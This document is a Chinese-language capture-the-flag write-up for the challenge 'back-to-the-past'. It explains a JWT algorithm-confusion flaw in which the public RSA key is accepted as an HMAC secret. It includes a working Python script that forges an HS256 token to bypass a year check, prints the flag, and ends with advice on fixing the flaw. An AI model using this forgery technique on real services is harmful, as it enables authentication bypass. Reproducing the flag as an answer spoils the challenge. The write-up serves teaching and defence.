# back-to-the-past

## 题目简述

用户注册时只能选择 1971 到 2023 年；访问 `/retro` 时 JWT 中的 `year <= 1970` 才返回 flag。服务用 RSA 私钥签发 RS256 token，却在验证时同时接受 RS256 和 HS256，并把同一份公开 RSA 公钥传给验证函数，形成 JWT 算法混淆。

## 解题过程

先注册普通用户取得合法 RS256 token，并从公开静态路径下载公钥。用题目附带的自定义 `jwt.py` 以 RS256 解码 payload，把年份改成 1970；随后选择 HS256，把“公开公钥的原始 PEM 字节”当作 HMAC 密钥重新签名：

```python
import random
import requests
from server import jwt

base = "https://TARGET/"
public_key = requests.get(base + "static/public_key.pem", timeout=10).content

response = requests.post(
    base + "register",
    data={"username": hex(random.randrange(1 << 32)), "year": "1980"},
    timeout=10,
)
token = response.cookies["token"].encode()

payload = jwt.decode(token, public_key, algorithms=["RS256"])
payload["year"] = "1970"
forged = jwt.encode(payload, public_key, algorithm="HS256")

page = requests.get(
    base + "retro", cookies={"token": forged.decode()}, timeout=10
).text
print(page[page.index("tjctf{"):page.index("}", page.index("tjctf{")) + 1])
```

服务根据 token 头部的 `alg=HS256` 走 HMAC 分支，并用公开公钥验证成功，输出：

```text
tjctf{very_very_retro_3bbff613}
```

## 方法总结

- 验证端不能让不可信 token 自由选择对称或非对称算法，更不能把同一 key 参数用于两种语义。
- RSA 公钥本来就是公开数据；一旦被错误地当成 HMAC 密钥，任何人都能生成有效 HS256 签名。
- 修复应固定预期算法为 RS256，并使用成熟 JWT 库按 key 类型严格校验，而不是维护自定义多算法分支。
